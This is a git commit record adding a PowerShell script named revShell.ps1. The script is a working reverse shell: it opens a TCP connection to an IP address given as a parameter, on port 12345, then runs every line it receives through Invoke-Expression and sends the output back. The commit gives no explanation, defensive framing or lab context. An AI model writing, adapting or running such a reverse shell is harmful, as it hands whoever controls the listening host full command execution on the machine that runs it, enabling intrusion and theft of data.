e592d2c698f2918608ceebfa31cf426213817f2c
Peach-Iced-Tea <134111163+Peach-Iced-Tea@users.noreply.github.com>
2024-07-11 16:38:58 +0200

    Create revShell.ps1

---
+++ revShell.ps1
@@ -0,0 +1,26 @@
+param (
+    [string]$ip
+)
+
+$port = 12345
+
+$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$reader = New-Object System.IO.StreamReader($stream)
+$writer.AutoFlush = $true
+
+while ($true) {
+    try {
+        $data = $reader.ReadLine()
+        if ($data -eq "exit") { break }
+        $result = Invoke-Expression $data 2>&1
+        $writer.WriteLine($result)
+    } catch {
+        break
+    }
+}
+
+$reader.Close()
+$writer.Close()
+$client.Close()
